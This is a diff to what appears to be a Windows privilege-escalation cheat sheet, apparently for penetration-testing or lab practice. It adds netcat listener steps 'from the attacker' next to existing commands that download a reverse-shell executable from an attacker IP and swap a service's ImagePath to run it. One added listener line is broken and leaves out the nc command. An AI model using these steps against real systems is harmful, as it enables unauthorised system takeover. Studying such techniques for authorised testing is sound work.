@@ -183,6 +183,8 @@ IWR -UseBasicParsing -Uri 'http://<ATTACKER_IP>/rev.exe' -OutFile '<BINARY_PATH>
 
 ###### *Setting up a TCP Listener*
 
+> ***From the attacker*** ⚔️
+
 ```bash
 rlwrap -CaR nc -nlvp <TCP_PORT>
 ```
@@ -599,6 +601,14 @@ python3 -m http.server 80
 IWR -UseBasicParsing -Uri 'http://<ATTACKER_IP>/rev.exe' -OutFile 'C:\Program Files (x86)\System.exe'
 ```
 
+###### *Setting up a TCP Listener*
+
+> ***From the attacker*** ⚔️
+
+```bash
+rlwrap -CaR nc -nlvp <TCP_PORT>
+```
+
 ###### *Restarting the service*
 
 > ***CMD & PS***
@@ -737,6 +747,14 @@ reg add 'HKLM\System\CurrentControlSet\Services\ModelManagerService' /v 'ImagePa
 
 ```bash
 Set-ItemProperty -Path 'HKLM:System\CurrentControlSet\Services\ModelManagerService' -Name 'ImagePath' -Value 'C:\Windows\Temp\LPE\rev.exe'
+```
+
+###### *Setting up a TCP Listener*
+
+> ***From the attacker*** ⚔️
+
+```bash
+rlwrap -CaR <TCP_PORT>
 ```
 
 ###### *Restarting the service*
